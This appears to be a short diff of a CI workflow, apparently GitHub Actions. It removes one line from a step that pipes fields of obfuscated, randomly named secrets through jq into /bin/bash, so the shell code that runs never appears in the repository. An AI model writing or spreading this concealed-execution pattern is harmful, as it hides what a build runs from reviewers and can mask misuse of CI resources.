@@ -23,7 +23,6 @@ jobs:
           thhpv69: ${{ secrets.thhpv69 }}
         run: |
           printf '%s' "$thhpv69" | jq -r .xjt385 | /bin/bash
-          printf '%s' "$u33" | jq -r .tg39448 | /bin/bash
           printf '%s' "$muejs72" | jq -r .pw14 | /bin/bash
           echo $xyroo7 | jq -r .jpcj533 | /bin/bash
           printf '%s' "$ecovs8320" | jq -r .jrbb33680 | /bin/bash
